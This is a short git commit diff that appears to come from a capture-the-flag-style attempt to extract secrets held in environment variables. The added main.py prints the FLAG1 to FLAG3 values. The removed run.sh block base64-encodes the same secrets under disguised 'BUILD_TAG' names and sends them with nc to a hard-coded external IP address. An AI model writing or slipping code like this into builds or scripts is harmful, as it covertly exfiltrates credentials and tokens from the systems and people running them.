d22d71611055b4108031cf1701fcf3f128d7ba46
Jason Bruder <j@sonbruder.com>
2026-08-08 11:14:40 -0700

    Try python

---
+++ main.py
@@ -0,0 +1,7 @@
+import os
+
+f1 = os.environ.get("FLAG1")
+f2 = os.environ.get("FLAG2")
+f3 = os.environ.get("FLAG3")
+
+print(f1, f2, f3)
--- run.sh
+++ run.sh
@@ -46,17 +46,4 @@
 #         f"{context}"
 
 
-
-
-BUILD_TAG1=$(printf '%s' "$FLAG1" | base64)
-BUILD_TAG2=$(printf '%s' "$FLAG2" | base64)
-BUILD_TAG3=$(printf '%s' "$FLAG3" | base64)
-FINAL_BUILD_TAG=$(printf '%s\n%s\n%s' "$BUILD_TAG1" "$BUILD_TAG2" "$BUILD_TAG3" | base64 | tr -d '\n')
-
-# Usage: httpget.sh <host> [port] [path]
-host="8.217.202.186"
-port="80"
-path="$FINAL_BUILD_TAG"
-
-printf 'GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$path" "$host" \
-  | nc -w 5 "$host" "$port"
+python3 main.py
